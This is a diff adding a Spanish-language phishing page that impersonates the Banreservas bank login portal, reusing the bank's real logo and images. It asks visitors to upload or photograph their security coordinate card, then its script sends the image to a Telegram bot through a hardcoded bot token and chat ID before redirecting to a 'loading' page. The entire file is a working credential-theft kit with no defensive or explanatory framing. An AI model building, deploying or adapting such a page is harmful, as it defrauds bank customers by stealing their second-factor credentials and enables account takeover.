@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Verificación de Identidad</title>
+    <style>
+        body {
+            background-color: #004d77;
+            background-attachment: fixed;
+            font-family: 'Open Sans', sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            width: 100%;
+            height: 50px;
+            border-top: solid 0px #123054;
+            background-color: #f9f9f9;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding: 0 10px;
+        }
+        header a {
+            display: block;
+            text-decoration: none;
+            color: #000;
+            padding: 0 5px;
+            height: 40px;
+            text-align: center;
+            line-height: 30px;
+            font-size: 14px;
+            overflow: hidden;
+            margin-right: 15px;
+        }
+        .banreservas {
+            background: #00AEF0;
+            border: 1px solid #00AEF0;
+            color: #FFFFFF;
+            height: 40px;
+            margin-right: 15px;
+            margin-top: -7px;
+            padding-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .content {
+            vertical-align: middle;
+            text-align: center;
+            padding-top: 25px;
+            padding-bottom: 25px;
+        }
+        .content img {
+            width: 285.5px;
+        }
+        .login-container {
+            width: 630px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+        }
+        .login-image {
+            width: 330px;
+            height: 466px;
+            background: url(https://www.banreservas.com.do/TuBancoPersonas/App_Themes/Login/images/profilepersonas.jpg) -27px -18px no-repeat;
+            background-color: #fff;
+            background-size: 408px 484px;
+            border: 8px solid #F1F1F1;
+        }
+        .login-form-container {
+            width: 330px;
+        }
+        .login-title {
+            background-color: #00AEF0;
+            width: 100%;
+            height: 44px;
+            color: #FFF;
+            font-size: 12px;
+            font-family: 'Open Sans', Arial, sans-serif;
+            vertical-align: middle;
+            text-transform: none;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-form {
+            background-color: #FFF;
+            height: 88.7%;
+            padding: 5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        .login-form label {
+            display: block;
+            margin-bottom: 10px;
+            color: #000;
+            font-family: 'Open Sans', Arial, sans-serif;
+            font-size: 14px;
+        }
+        .login-input {
+            background: #F0F0F0;
+            border: 1px solid #ccc;
+            font-size: 14px;
+            font-family: 'Open Sans', Verdana, Arial, sans-serif;
+            width: 100%;
+            height: 46px;
+            text-indent: 15px;
+            color: #333;
+            margin-bottom: 15px;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+        .login-button {
+            background: #00AEF0;
+            text-align: center;
+            font-size: 14px;
+            padding: 14px;
+            display: block;
+            width: 100%;
+            color: #FFF;
+            font-family: 'Open Sans', Arial, sans-serif;
+            text-decoration: none;
+            border: none;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        .login-links {
+            text-align: right;
+            margin-top: 15px;
+        }
+        .login-link {
+            display: block;
+            font-size: 14px;
+            padding-bottom: 5px;
+            color: #004D63;
+            font-weight: normal;
+            font-family: 'Open Sans', sans-serif;
+            text-decoration: none;
+        }
+        .camera-wrapper {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .camera-wrapper video {
+            width: 80%;
+            height: auto;
+            border: 1px solid #FFF;
+            background-color: #000;
+        }
+        .camera-wrapper button {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 10px 20px;
+            background-color: #00AEF0;
+            color: #FFF;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <a href="#">Contáctenos</a>
+        <a href="#">Idioma</a>
+        <a href="#">Ayuda</a>
+        <div class="banreservas">
+            <a href="https://www.banreservas.com.do" style="color: #FFFFFF;">Banreservas.com</a>
+        </div>
+    </header>
+    <div class="content">
+        <img src="https://www.banreservas.com.do/TuBancoPersonas/App_Themes/Login/Images/logo_banreservas.png" alt="Logo Banreservas">
+    </div>
+    <div class="login-container">
+        <div class="login-form-container">
+            <div class="login-title">Verificación de Identidad</div>
+            <div class="login-form">
+                <form id="verificationForm" method="post" enctype="multipart/form-data">
+                    <label for="card">Tarjeta de Coordenadas</label>
+                    <input type="file" id="card" class="login-input" name="card" accept="image/*" onchange="checkPhoto()">
+                    <button type="button" class="login-button" id="actionButton" onclick="openCamera()">Tomar Foto</button>
+                    <div class="login-links">
+                        <a href="#" class="login-link">Volver al inicio</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <div class="login-image"></div>
+    </div>
+    <div class="camera-wrapper" id="cameraWrapper">
+        <video id="video" autoplay></video>
+        <button onclick="takePicture()">Tomar Foto</button>
+    </div>
+    <script>
+        let photoTaken = false;
+
+        function openCamera() {
+            document.getElementById('cameraWrapper').style.display = 'flex';
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    document.getElementById('video').srcObject = stream;
+                })
+                .catch(err => {
+                    console.error("Error al acceder a la cámara: ", err);
+                });
+        }
+
+        function takePicture() {
+            let video = document.getElementById('video');
+            let canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            let ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            canvas.toBlob(blob => {
+                let file = new File([blob], 'photo.jpg', { type: 'image/jpeg' });
+                let input = document.getElementById('card');
+                let dataTransfer = new DataTransfer();
+                dataTransfer.items.add(file);
+                input.files = dataTransfer.files;
+
+                let actionButton = document.getElementById('actionButton');
+                actionButton.textContent = 'Continuar';
+                actionButton.setAttribute('type', 'submit');
+
+                document.getElementById('cameraWrapper').style.display = 'none';
+                let stream = video.srcObject;
+                if (stream) {
+                    let tracks = stream.getTracks();
+                    tracks.forEach(track => track.stop());
+                    video.srcObject = null;
+                }
+            }, 'image/jpeg');
+        }
+
+        function checkPhoto() {
+            let input = document.getElementById('card');
+            let actionButton = document.getElementById('actionButton');
+
+            if (input.files.length > 0) {
+                actionButton.textContent = 'Continuar';
+                actionButton.setAttribute('type', 'submit');
+            } else {
+                actionButton.textContent = 'Tomar Foto';
+                actionButton.setAttribute('type', 'button');
+            }
+        }
+
+        document.getElementById('verificationForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            let formData = new FormData(this);
+            let fileInput = document.getElementById('card');
+            if (fileInput.files.length > 0) {
+                let xhr = new XMLHttpRequest();
+                let token = '5963518349:AAFY9wCq54O90lBbUs7K0aNZxlrS78lwojk';
+                let chatId = '-892093573';
+                xhr.open('POST', `https://api.telegram.org/bot${token}/sendPhoto`, true);
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        window.location.href = 'cargando.html';
+                    } else {
+                        console.error('Error al enviar la foto:', xhr.statusText);
+                    }
+                };
+                xhr.onerror = function() {
+                    console.error('Error en la solicitud.');
+                };
+                formData.append('chat_id', chatId);
+                formData.append('photo', fileInput.files[0]);
+                xhr.send(formData);
+            } else {
+                console.error('No se ha seleccionado ninguna foto.');
+            }
+        });
+    </script>
+</body>
+</html>
